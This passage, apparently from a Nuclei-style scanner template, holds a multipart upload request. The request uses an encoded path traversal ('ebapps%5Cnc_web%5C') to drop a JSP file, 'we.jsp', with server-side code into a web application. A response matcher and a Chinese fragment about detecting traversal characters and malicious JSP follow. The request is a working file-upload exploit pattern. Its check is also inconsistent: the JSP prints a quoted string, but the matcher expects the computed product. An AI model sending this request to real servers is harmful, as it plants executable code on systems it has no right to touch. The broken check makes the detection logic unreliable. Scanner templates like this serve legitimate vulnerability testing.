        ebapps%5Cnc_web%5C HTTP/1.1

        boundary=d0b7a0d40eed0e32904c8017b09eb305
        
        --d0b7a0d40eed0e32904c8017b09eb305
        Content-Disposition: form-data; name="file"; filename="we.jsp" 
        Content-Type: text/plain
        <%out.print("1222*1222");%>
        
        --d0b7a0d40eed0e32904c8017b09eb305--

    matchers:
      - type: word
        part: body
        words:
          - "1493284"

求中出现的路径穿越字符和恶意 JSP 代码。
